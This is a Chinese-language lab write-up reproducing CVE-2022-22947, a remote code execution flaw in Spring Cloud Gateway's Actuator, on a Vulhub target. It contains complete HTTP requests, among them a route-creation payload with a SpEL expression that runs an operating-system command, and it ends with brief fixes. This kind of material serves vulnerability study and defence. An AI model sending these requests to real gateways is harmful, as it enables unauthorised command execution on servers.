# 【CVE-2022-22947】_Spring Cloud Gateway RCE

*** 前言***

- 使用的Vulhub靶场
- 攻击机：192.168.200.155， 靶机： 192.168.200.150

### 漏洞原理

Acutator可以通过接口列出、创建、刷新路由：

1. /actuator/gateway/routes    列出路由

2. /gateway/routes/{id_routers_to_create}   创建路由  

3. /actuator/gateway/refresh   刷新路由

当路由带有恶意的Filter时，里面的恶意sqEL表达式将会被执行



### 影响范围

Spring Cloud Gateway <3.1.1

Spring Cloud Gateway <3.0.7

### 漏洞复现

- kali里用docker-compose up -d 启动docker环境

  ![image-20240506130300943](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240506130300943.png)

  

- 查看到8080端口出现该页面即启动成功。

  ![image-20240506130434737](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240506130434737.png)

- 攻击机开启Burp Suite进入重放模块使用POST请求构造spEL表达式的路由并发送。

  ```
  //使用POST请求创建一个名为'zz'的路由
  
  POST /actuator/gateway/routes/zz  HTTP/1.1
  Host: 192.168.200.150:8080
  Accept-Encoding: gzip, deflate
  Accept: */*
  Accept-Language: en
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like         Gecko) Chrome/97.0.4692.71 Safari/537.36
  Connection: close
  Content-Type: application/json
  Content-Length: 310
  
  
  {
    "id": "zz",
   "filters": [{
  "name": "AddResponseHeader",
  "args": {
    "name": "Result",
    "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
  }
    }],
    "uri": "http://example.com"
  }
  
  ```

  

![image-20240506132747081](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240506132747081.png)

- 应用之前的路由，再构造并发送一个刷新路由的数据包。

  ```
  //使用POST请求刷新路由
  
  
  POST /actuator/gateway/refresh  HTTP/1.1
  Host: 192.168.200.150:8080
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/json
  Content-Length: 0
  
  
  
  ```
  ![image-20240506141126038](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240506141126038.png)

- 最后构造一个数据包来查看执行结果。

  ```
  //列出路由的请求包
  
  GET /actuator/gateway/routes/zz HTTP/1.1
  Host: 192.168.200.150:8080
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  Accept-Language: zh-CN,zh;q=0.9
  Connection: close
  Content-Type: application/json
  Content-Length: 0
  
  
  ```
  ![image-20240506141350979](https://hecker-typora.oss-cn-shanghai.aliyuncs.com/image-20240506141350979.png)

- 可以看到命令成功执行，此次漏洞复现成功。

### 漏洞修复

1. 升级安全版本。
2. 打补丁。

  